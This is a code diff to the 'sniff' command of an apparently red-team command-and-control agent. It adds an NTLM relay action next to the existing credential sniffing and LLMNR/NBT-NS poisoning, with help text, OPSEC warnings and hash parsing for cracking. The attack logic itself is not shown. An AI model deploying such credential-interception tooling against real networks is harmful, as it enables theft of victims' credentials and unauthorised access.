@@ -12,10 +12,10 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "sniff",
-		Description:         "Network sniffing and poisoning. capture: passive credential sniffing. poison: LLMNR/NBT-NS/mDNS responder for credential interception.",
-		HelpString:          "sniff [-action capture] [-interface eth0] [-duration 30] [-ports 21,80,445]\nsniff -action poison [-response_ip 10.0.0.5] [-protocols llmnr,nbtns] [-duration 120]",
-		Version:             2,
-		MitreAttackMappings: []string{"T1040", "T1557.001"}, // Network Sniffing + LLMNR/NBT-NS Poisoning
+		Description:         "Network sniffing, poisoning, and relay. capture: passive credential sniffing. poison: LLMNR/NBT-NS/mDNS responder. relay: NTLM relay to target SMB.",
+		HelpString:          "sniff [-action capture] [-interface eth0] [-duration 30] [-ports 21,80,445]\nsniff -action poison [-response_ip 10.0.0.5] [-protocols llmnr,nbtns] [-duration 120]\nsniff -action relay -response_ip <target_smb_host> [-ports listen:target] [-duration 120]",
+		Version:             3,
+		MitreAttackMappings: []string{"T1040", "T1557.001"}, // Network Sniffing + LLMNR/NBT-NS Poisoning + Relay
 		Author:              "@galoryber",
 		ScriptOnlyCommand:   false,
 		AssociatedBrowserScript: &agentstructs.BrowserScript{
@@ -30,8 +30,8 @@ func init() {
 				Name:          "action",
 				CLIName:       "action",
 				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:       []string{"capture", "poison"},
-				Description:   "capture: passive network sniffing (default). poison: LLMNR/NBT-NS/mDNS responder for credential interception (T1557.001).",
+				Choices:       []string{"capture", "poison", "relay"},
+				Description:   "capture: passive network sniffing (default). poison: LLMNR/NBT-NS/mDNS responder (T1557.001). relay: NTLM relay to target SMB (T1557.001).",
 				DefaultValue:  "capture",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
@@ -166,13 +166,21 @@ func init() {
 		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
 			action, _ := taskData.Args.GetStringArg("action")
 			var msg string
-			if action == "poison" {
+			switch action {
+			case "poison":
 				msg = "OPSEC CRITICAL: LLMNR/NBT-NS/mDNS poisoning (T1557.001) actively responds to multicast/broadcast name resolution queries. " +
 					"This generates network traffic that IDS/IPS signatures specifically detect (Responder-like behavior). " +
 					"Multiple hosts may authenticate to the attacker IP — monitor for account lockouts. " +
 					"Requires root/CAP_NET_RAW for raw socket + UDP multicast listeners. " +
 					"Poisoning is ACTIVE — it sends packets, not just captures."
-			} else {
+			case "relay":
+				msg = "OPSEC CRITICAL: NTLM relay (T1557.001) starts an HTTP server that triggers NTLM authentication and relays captured " +
+					"credentials to a target SMB server. This opens a TCP listener, generates SMB traffic to the target, and may trigger " +
+					"network IDS signatures (ntlmrelayx-like behavior). Successful relay bypasses SMB signing and authenticates as the victim. " +
+					"Monitor for: HTTP listener on non-standard port, SMB session from unexpected source, account lockouts. " +
+					"Requires: SMB signing DISABLED on target (default for non-DCs). " +
+					"Relay is ACTIVE — it intercepts and forwards authentication in real-time."
+			default:
 				msg = "OPSEC WARNING: Network sniffing (T1040) opens a raw socket which requires root/CAP_NET_RAW (Linux/macOS) or Administrator (Windows). " +
 					"Windows uses SIO_RCVALL which may be flagged by security products. " +
 					"Promiscuous mode changes the NIC state and may be detected by network monitoring tools (promiscdetect, antisniff). " +
@@ -204,7 +212,13 @@ func init() {
 			if displayParams, err := task.Args.GetFinalArgs(); err == nil && displayParams != "" {
 				response.DisplayParams = &displayParams
 			}
-			createArtifact(task.Task.ID, "Raw Socket", "AF_PACKET raw socket for network sniffing")
+			action, _ := task.Args.GetStringArg("action")
+			if action == "relay" {
+				createArtifact(task.Task.ID, "TCP Listener", "HTTP listener for NTLM relay victim connections")
+				createArtifact(task.Task.ID, "SMB Connection", "SMB2 session to relay target for NTLM authentication forwarding")
+			} else {
+				createArtifact(task.Task.ID, "Raw Socket", "AF_PACKET raw socket for network sniffing")
+			}
 			return response
 		},
 		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
@@ -237,7 +251,7 @@ func init() {
 				if c.Protocol == "ntlm" {
 					credType = "hash"
 					credential = c.Detail
-				} else if c.Protocol == "ntlmv2" {
+				} else if c.Protocol == "ntlmv2" || c.Protocol == "ntlmv2-relay" {
 					credType = "hash"
 					credential = c.Password // hashcat mode 5600 format
 				} else if c.Protocol == "krb-asrep" || c.Protocol == "krb-tgsrep" {
